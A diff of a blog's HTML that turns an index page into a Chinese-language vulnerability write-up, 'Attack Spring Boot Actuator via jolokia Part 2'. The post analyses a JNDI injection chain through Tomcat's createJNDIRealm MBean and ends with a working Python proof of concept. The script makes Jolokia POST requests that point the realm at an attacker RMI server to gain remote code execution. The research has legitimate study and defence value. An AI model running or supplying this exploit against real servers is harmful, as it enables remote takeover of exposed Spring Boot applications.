@@ -15,7 +15,7 @@
     <meta name="description" content="Some Lucifaer's security researchers and security analysis">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>Lucifaer&#39;s Blog</title>
+    <title>Attack Spring Boot Actuator via jolokia Part 2 · Lucifaer&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -70,6 +70,8 @@
 
     <link rel="preload" href= /css/style.css?v=20180721 as="style" onload="this.onload=null;this.rel='stylesheet'" />
     <link rel="stylesheet" href= /css/mobile.css?v=20180721 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -209,12 +211,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Lucifaer&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Attack Spring Boot Actuator via jolokia Part 2</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>Lucifaer's Blog.</a>
 </header>
@@ -228,24 +241,80 @@
 
 
 
+height:50vh;
+
 >
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            Attack Spring Boot Actuator via jolokia Part 2
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞分析">漏洞分析</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Java">Java</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Spring">Spring</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "jolokia">jolokia</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">1,352</span> / Reading time: <span class="post-count">5 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/03/13</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -346,72 +415,141 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/07/19/薅羊毛产业链分析/" >
-            
-                <span>薅羊毛产业链分析</span>
-        </a>
-        <div class="abstract-content">
-            <p>羊毛党会根据不同的业务情况使用不同方法完成相应的工作。下面举例两个较为不同的场景来简要的说一下薅羊毛的产业链。</p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/19</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "黑产研究">黑产研究</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "薅羊毛">薅羊毛</a>
-    
-</div>
-            
-        </div>
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>本文接<a href="https://www.lucifaer.com/2019/03/11/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%201/" target="_blank" rel="noopener">上文</a>，这里不会分析原文章中所说的<code>/env</code>这种利用的方法，而是说一下rr大佬的发现的另外一条利用链。</p>
+<a id="more"></a>
+<h1 id="0x01-检查MBean"><a href="#0x01-检查MBean" class="headerlink" title="0x01 检查MBean"></a>0x01 检查MBean</h1><p>如果说不存在<code>ch.qos.logback.classic reloadByURL</code>这个MBean，还能不能造成RCE呢，这个是我在看完文章后的一个想法。如果说想要解决这个问题，我们需要再看看<code>/jolokia/list</code>中还有哪些利用链可用（真的是太多了T T，由于当时看完记得是在Spring Boot中内嵌的Tomcat中，所以直接看的这个类，然而这个类差点也看跪了T T）。</p>
+<p>最终找到<code>org.apache.catalina.mbeans.MBeanFactory</code>这个可能能造成JNDI注入的类，其中有以下这么几个方法从注释的描述中感觉是可以造成JNDI注入的：</p>
+<ul>
+<li>createUserDatabaseRealm</li>
+<li>createDataSourceRealm</li>
+<li>createJNDIRealm</li>
+</ul>
+<p>这几点中只有最后的<code>createJNDIRealm</code>是可用的，但是他们前面的处理流程都是一样的，接下来就将他们前面的处理流程简单的分析一下，并说明为什么只有<code>createJNDIRealm</code>是可用的。</p>
+<h1 id="0x02-Realm创建流程分析"><a href="#0x02-Realm创建流程分析" class="headerlink" title="0x02 Realm创建流程分析"></a>0x02 Realm创建流程分析</h1><p>Realm是一个MVCC数据库，而MVCC是用于解决多版本并发问题的一个方法。有关Realm的一些具体介绍可以参考<a href="https://infoq.cn/article/introduce-and-common-problems-of-java-realm-principle" target="_blank" rel="noopener">这篇文章</a>。而我自己的理解是就是它给每一个连接的线程建立了一个“快照”，当两个请求同时到达一个线程时，程序不会造成阻塞，而是会在这个“快照”（也是一个线程）中进行操作，当执行完成后，阻塞合并更改（有点像git）：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524594370154.jpg" alt=""></p>
+<p>然而Realm的原理跟我们主要要说的关系不大，tomcat在创建不同的Realm时其实大致的流程都是相同的，只是最后的具体实现不同而已，比如上一节中说道的三个Realm的创建在代码实现流程上是极为相似的：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524597728514.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524598003140.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524598293266.jpg" alt=""></p>
+<p>所以我们跟一下红框的部分然后看具体实现就好。</p>
+<p>不难看出关键点在于<code>container.setRealm(realm);</code>，跟进看一下：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524599308045.jpg" alt=""></p>
+<p>如果不存在则创建一个新的realm，这里涉及到<code>Lifecycle</code>的一部分设计与实现，如果想要了解<code>Lifecycle</code>的细节的话，可以参考<a href="https://uule.iteye.com/blog/2340873" target="_blank" rel="noopener">这篇文章</a>。跟进看一下：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524602845599.jpg" alt=""></p>
+<p>看一下这个<code>startInternal</code>的具体实现，发现是一个虚类，那么看一下它的继承关系，找一下它的具体实现：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524603700935.jpg" alt=""></p>
+<p>可以看到我们所找到这三个Realm的具体实现点了。</p>
+<p>下面说一下为什么<code>createUserDatabaseRealm</code>和<code>createDataSourceRealm</code>不能用。</p>
+<ol>
+<li><p><code>createUserDatabaseRealm</code></p>
+<p> <img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524609882924.jpg" alt=""></p>
+<p> 乍一看<code>resourceName</code>可控，好像可以JNDI注入，然后发现<code>getGlobalNamingContext()</code>返回的是一个null：<br> <img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524612274679.jpg" alt=""></p>
+<p> 所以无法利用。</p>
+</li>
+<li><p><code>createDataSourceRealm</code></p>
+<p> <img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524613635835.jpg" alt=""></p>
+<p> 好像并不可以利用。</p>
+</li>
+</ol>
+<h1 id="0x03-createJNDIRealm的利用分析"><a href="#0x03-createJNDIRealm的利用分析" class="headerlink" title="0x03 createJNDIRealm的利用分析"></a>0x03 createJNDIRealm的利用分析</h1><p>那么再来看看<code>createJNDIRealm</code>：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524621841028.jpg" alt=""></p>
+<p>这里有两个重要的点，<code>createDirContext()</code>用env来创建一个<code>InitialDirContext</code>，另一个点是<code>Context.*</code>的配置我们可以控。</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524622183426.jpg" alt=""></p>
+<p>那么具体的JNDI触发点在哪里呢？我们需要着重跟一下<code>createDirContext</code>。</p>
+<p>首先<code>createDirContext</code>最后返回一个<code>InitialDirContext</code>对象，而这个对象是根据env来生成的：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524690909944.jpg" alt=""></p>
+<p>跟进，发现这个<code>InitialDirContext</code>实际上是<code>InitialContext</code>的子类，为什么要着重强调这一点呢？因为JDNI的两个必备要素中就一个要求是：上下文对象是通过InitialContext及其子类实例化的，且他们的lookup()方法允许动态协议切换。</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524691845838.jpg" alt=""></p>
+<p>跟进看一下：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524693086609.jpg" alt=""></p>
+<p><code>myProps</code>通过传入的初始上下文配置经过处理返回完整的上下文环境，可以把它看成env的“完整版”。接着向下跟进：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524696352727.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524696880123.jpg" alt=""></p>
+<p>注意红框部分，我们可以通过设置env中的<code>INITIAL_CONTEXT_FACTORY</code>来控制这里的<code>factory</code>，可以看一下有哪些是我们可以指定的：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524697878039.jpg" alt=""></p>
+<p>可以看到我们可以指定<code>com.sun.jndi.rmi.registry</code>，来进行rmi的操作，来看一下具体实现：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524698748309.jpg" alt=""></p>
+<p>这里的<code>var1</code>还是我们的env，也就是说这里的第一个参数是可控的：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524699844960.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524700331051.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524700603297.jpg" alt=""></p>
+<p><code>var0</code>、<code>var1</code>可控，还调用了<code>lookup()</code>，在这里完成了JDNI的注入。</p>
+<h1 id="0x04-构造poc"><a href="#0x04-构造poc" class="headerlink" title="0x04 构造poc"></a>0x04 构造poc</h1><p>梳理一下思路，我们需要做这么几部来完成攻击：</p>
+<ol>
+<li>创建<code>JNDIRealm</code></li>
+<li>通过<code>getDirectoryContextEnvironment()</code>来设置<code>contextFactory</code>为<code>RegistryContextFactory</code>，并将<code>connectionURL</code>设置为自己的N/D服务器</li>
+<li>重启Realm来完成更改并执行（stop、start）</li>
+</ol>
+<p>也就是说需要发4次请求。</p>
+<p>在利用过程中get请求的构造比较麻烦这里用post请求来构造poc，关于post如何解析的可以参考get请求解析的分析流程，这里就不过多描述了。</p>
+<p>poc：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import requests as req</span><br><span class="line">import sys</span><br><span class="line">from pprint import pprint</span><br><span class="line"></span><br><span class="line">url = sys.argv[1] + &quot;/jolokia/&quot;</span><br><span class="line">pprint(url)</span><br><span class="line"></span><br><span class="line">create_JNDIrealm = &#123;</span><br><span class="line">    &quot;mbean&quot;: &quot;Tomcat:type=MBeanFactory&quot;,</span><br><span class="line">    &quot;type&quot;: &quot;EXEC&quot;,</span><br><span class="line">    &quot;operation&quot;: &quot;createJNDIRealm&quot;,</span><br><span class="line">    &quot;arguments&quot;: [&quot;Tomcat:type=Engine&quot;]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_contextFactory = &#123;</span><br><span class="line">    &quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;,</span><br><span class="line">    &quot;type&quot;: &quot;WRITE&quot;,</span><br><span class="line">    &quot;attribute&quot;: &quot;contextFactory&quot;,</span><br><span class="line">    &quot;value&quot;: &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_connectionURL = &#123;</span><br><span class="line">    &quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;,</span><br><span class="line">    &quot;type&quot;: &quot;WRITE&quot;,</span><br><span class="line">    &quot;attribute&quot;: &quot;connectionURL&quot;,</span><br><span class="line">    &quot;value&quot;: &quot;rmi://localhost:1097/Exploit&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop_JNDIrealm = &#123;</span><br><span class="line">    &quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;,</span><br><span class="line">    &quot;type&quot;: &quot;EXEC&quot;,</span><br><span class="line">    &quot;operation&quot;: &quot;stop&quot;,</span><br><span class="line">    &quot;arguments&quot;: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">start = &#123;</span><br><span class="line">    &quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;,</span><br><span class="line">    &quot;type&quot;: &quot;EXEC&quot;,</span><br><span class="line">    &quot;operation&quot;: &quot;start&quot;,</span><br><span class="line">    &quot;arguments&quot;: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]</span><br><span class="line"></span><br><span class="line">for i in expoloit:</span><br><span class="line">    rep = req.post(url, json=i)</span><br><span class="line">    pprint(rep.json())</span><br></pre></td></tr></table></figure>
+<p>效果：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524743021935.jpg" alt=""></p>
+<h1 id="0x05-Reference"><a href="#0x05-Reference" class="headerlink" title="0x05 Reference"></a>0x05 Reference</h1><ul>
+<li><a href="https://infoq.cn/article/introduce-and-common-problems-of-java-realm-principle" target="_blank" rel="noopener">https://infoq.cn/article/introduce-and-common-problems-of-java-realm-principle</a></li>
+<li><a href="https://uule.iteye.com/blog/2340873" target="_blank" rel="noopener">https://uule.iteye.com/blog/2340873</a></li>
+<li><a href="https://ricterz.me/posts/2019-03-06-yet-another-way-to-exploit-spring-boot-actuators-via-jolokia.txt" target="_blank" rel="noopener">https://ricterz.me/posts/2019-03-06-yet-another-way-to-exploit-spring-boot-actuators-via-jolokia.txt</a></li>
+</ul>
+
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2017/07/20/Blackhat SEO/" >
-            
-                <span>Blackhat SEO</span>
-        </a>
-        <div class="abstract-content">
-            <p>之前分析黑产SEO的笔记</p>
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://lucifaer.com">Lucifaer</a>
+            <p>原文链接: <a href="https://lucifaer.com/2019/03/13/Attack Spring Boot Actuator via jolokia Part 2/">https://lucifaer.com/2019/03/13/Attack Spring Boot Actuator via jolokia Part 2/</a>
+            <p>发表日期: <a href="https://lucifaer.com/2019/03/13/Attack Spring Boot Actuator via jolokia Part 2/">March 13th 2019, 6:57:00 pm</a>
+            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2017/07/20</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "黑产研究">黑产研究</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "BlackHat SEO">BlackHat SEO</a>
-    
-</div>
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/03/11/Attack Spring Boot Actuator via jolokia Part 1/" title= Attack Spring Boot Actuator via jolokia Part 1 >
+                    <div class="prevTitle">Attack Spring Boot Actuator via jolokia Part 1</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid= MTAyMC8zODcyOC8xNTI1Ng==>
+        <script type="text/javascript">
+            (function(d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+         
+                if (typeof LivereTower === 'function') { return; }
+         
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+         
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+             </script>
+         <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -493,6 +631,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-检查MBean"><span class="toc-number">1.</span> <span class="toc-text">0x01 检查MBean</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-Realm创建流程分析"><span class="toc-number">2.</span> <span class="toc-text">0x02 Realm创建流程分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-createJNDIRealm的利用分析"><span class="toc-number">3.</span> <span class="toc-text">0x03 createJNDIRealm的利用分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-构造poc"><span class="toc-number">4.</span> <span class="toc-text">0x04 构造poc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-Reference"><span class="toc-number">5.</span> <span class="toc-text">0x05 Reference</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1278,6 +1434,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
